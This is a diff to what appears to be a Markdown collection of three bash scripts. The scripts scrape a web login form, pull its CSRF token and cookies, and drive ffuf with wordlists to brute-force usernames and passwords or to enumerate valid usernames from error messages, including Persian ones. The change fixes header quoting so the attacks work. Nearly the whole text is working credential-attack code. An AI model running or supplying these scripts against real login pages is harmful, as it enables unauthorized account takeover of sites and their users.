@@ -77,29 +77,30 @@ if [ -n "$CSRF_FIELD" ]; then
     CSRF_VALUE=$(echo "$FORM" | grep -oiP "<input[^>]+name=\"$CSRF_FIELD\"[^>]*>" | grep -oiP 'value="\K[^"]+')
 fi
 
-# Extract cookies - extract only name=value for each Set-Cookie
-COOKIES=$(curl -s -I "$URL" | grep -i '^Set-Cookie:' | sed -E 's/^Set-Cookie: //I')
-
 # Prepare payload data for fuzzing
 DATA="${USERNAME_FIELD}=FUZZ1&${PASSWORD_FIELD}=FUZZ2"
 if [ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ]; then
     DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"
 fi
 
-# Build headers string
-HEADERS=""
-HEADERS="$HEADERS -H 'Content-Type: application/x-www-form-urlencoded'"
-HEADERS="$HEADERS -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0'"
-HEADERS="$HEADERS -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'"
-HEADERS="$HEADERS -H 'Accept-Language: en-US,en;q=0.5'"
-HEADERS="$HEADERS -H 'Accept-Encoding: gzip, deflate'"
-HEADERS="$HEADERS -H 'Connection: keep-alive'"
-HEADERS="$HEADERS -H 'Upgrade-Insecure-Requests: 1'"
-HEADERS="$HEADERS -H 'Referer: $URL'"
+# Extract cookies - extract only name=value for each Set-Cookie
+COOKIES=$(curl -s -I "$URL" | grep -i '^Set-Cookie:' | sed -E 's/^Set-Cookie: //I')
+
+# Build headers array
+HEADERS=(
+  -H "Content-Type: application/x-www-form-urlencoded"
+  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0"
+  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
+  -H "Accept-Language: en-US,en;q=0.5"
+  -H "Accept-Encoding: gzip, deflate"
+  -H "Connection: keep-alive"
+  -H "Upgrade-Insecure-Requests: 1"
+  -H "Referer: $URL"
+)
 
 # Add cookies header if found
 if [ -n "$COOKIES" ]; then
-    HEADERS="$HEADERS -H 'Cookie: $COOKIES'"
+    HEADERS+=(-H "Cookie: $COOKIES")
 fi
 
 # Run ffuf with constructed parameters
@@ -111,7 +112,7 @@ if [[ "$METHOD" == "get" ]]; then
          -X GET \
          -ac -c -r \
          -mc 200 \
-         $HEADERS
+         "${HEADERS[@]}"
 else
     ffuf -u "$FULL_ACTION" \
          -w "$USERLIST:FUZZ1" \
@@ -120,7 +121,7 @@ else
          -d "$DATA" \
          -ac -c -r \
          -mc 200 \
-         $HEADERS
+         "${HEADERS[@]}"
 fi
 ```
 
@@ -200,29 +201,30 @@ if [ -n "$CSRF_FIELD" ]; then
     CSRF_VALUE=$(echo "$FORM" | grep -oiP "<input[^>]+name=\"$CSRF_FIELD\"[^>]*>" | grep -oiP 'value="\K[^"]+')
 fi
 
-# Extract cookies - extract only name=value for each Set-Cookie
-COOKIES=$(curl -s -I "$URL" | grep -i '^Set-Cookie:' | sed -E 's/^Set-Cookie: //I')
-
 # Prepare payload data for fuzzing
 DATA="${USERNAME_FIELD}=FUZZ1&${PASSWORD_FIELD}=FUZZ2"
 if [ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ]; then
     DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"
 fi
 
-# Build headers string
-HEADERS=""
-HEADERS="$HEADERS -H 'Content-Type: application/x-www-form-urlencoded'"
-HEADERS="$HEADERS -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0'"
-HEADERS="$HEADERS -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'"
-HEADERS="$HEADERS -H 'Accept-Language: en-US,en;q=0.5'"
-HEADERS="$HEADERS -H 'Accept-Encoding: gzip, deflate'"
-HEADERS="$HEADERS -H 'Connection: keep-alive'"
-HEADERS="$HEADERS -H 'Upgrade-Insecure-Requests: 1'"
-HEADERS="$HEADERS -H 'Referer: $URL'"
+# Extract cookies - extract only name=value for each Set-Cookie
+COOKIES=$(curl -s -I "$URL" | grep -i '^Set-Cookie:' | sed -E 's/^Set-Cookie: //I')
+
+# Build headers array
+HEADERS=(
+  -H "Content-Type: application/x-www-form-urlencoded"
+  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0"
+  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
+  -H "Accept-Language: en-US,en;q=0.5"
+  -H "Accept-Encoding: gzip, deflate"
+  -H "Connection: keep-alive"
+  -H "Upgrade-Insecure-Requests: 1"
+  -H "Referer: $URL"
+)
 
 # Add cookies header if found
 if [ -n "$COOKIES" ]; then
-    HEADERS="$HEADERS -H 'Cookie: $COOKIES'"
+    HEADERS+=(-H "Cookie: $COOKIES")
 fi
 
 # Run ffuf with constructed parameters
@@ -235,7 +237,7 @@ if [[ "$METHOD" == "get" ]]; then
          -ac -c -r \
          -mc 200 \
          -fr "invalid username|invalid password|login failed|authentication failed|unauthorized|access denied| نام کاربری یا رمز عبور معتبر نیست" \
-         $HEADERS
+         "${HEADERS[@]}"
 else
     ffuf -u "$FULL_ACTION" \
          -w "$USERLIST:FUZZ1" \
@@ -245,7 +247,7 @@ else
          -ac -c -r \
          -mc 200 \
          -fr "invalid username|invalid password|login failed|authentication failed|unauthorized|access denied| نام کاربری یا رمز عبور معتبر نیست" \
-         $HEADERS
+         "${HEADERS[@]}"
 fi
 ```
 
@@ -324,29 +326,30 @@ if [ -n "$CSRF_FIELD" ]; then
     CSRF_VALUE=$(echo "$FORM" | grep -oiP "<input[^>]+name=\"$CSRF_FIELD\"[^>]*>" | grep -oiP 'value="\K[^"]+')
 fi
 
-# Extract cookies - extract only name=value for each Set-Cookie
-COOKIES=$(curl -s -I "$URL" | grep -i '^Set-Cookie:' | sed -E 's/^Set-Cookie: //I')
-
 # Prepare payload data for fuzzing
 DATA="${USERNAME_FIELD}=FUZZ1&${PASSWORD_FIELD}=Fakepassword1234"
 if [ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ]; then
     DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"
 fi
 
-# Build headers string
-HEADERS=""
-HEADERS="$HEADERS -H 'Content-Type: application/x-www-form-urlencoded'"
-HEADERS="$HEADERS -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0'"
-HEADERS="$HEADERS -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'"
-HEADERS="$HEADERS -H 'Accept-Language: en-US,en;q=0.5'"
-HEADERS="$HEADERS -H 'Accept-Encoding: gzip, deflate'"
-HEADERS="$HEADERS -H 'Connection: keep-alive'"
-HEADERS="$HEADERS -H 'Upgrade-Insecure-Requests: 1'"
-HEADERS="$HEADERS -H 'Referer: $URL'"
+# Extract cookies - extract only name=value for each Set-Cookie
+COOKIES=$(curl -s -I "$URL" | grep -i '^Set-Cookie:' | sed -E 's/^Set-Cookie: //I')
+
+# Build headers array
+HEADERS=(
+  -H "Content-Type: application/x-www-form-urlencoded"
+  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0"
+  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
+  -H "Accept-Language: en-US,en;q=0.5"
+  -H "Accept-Encoding: gzip, deflate"
+  -H "Connection: keep-alive"
+  -H "Upgrade-Insecure-Requests: 1"
+  -H "Referer: $URL"
+)
 
 # Add cookies header if found
 if [ -n "$COOKIES" ]; then
-    HEADERS="$HEADERS -H 'Cookie: $COOKIES'"
+    HEADERS+=(-H "Cookie: $COOKIES")
 fi
 
 # Run ffuf with constructed parameters
@@ -358,7 +361,7 @@ if [[ "$METHOD" == "get" ]]; then
          -ac -c -r \
          -mc 200 \
          -mr "invalid username|user not found|unknown user|no such user|نام کاربری اشتباه|کاربر یافت نشد" \
-         $HEADERS
+         "${HEADERS[@]}"
 else
     ffuf -u "$FULL_ACTION" \
          -w "$USERLIST:FUZZ1" \
@@ -367,7 +370,7 @@ else
          -ac -c -r \
          -mc 200 \
          -mr "invalid username|user not found|unknown user|no such user|نام کاربری اشتباه|کاربر یافت نشد" \
-         $HEADERS
+         "${HEADERS[@]}"
 fi
 ```
 
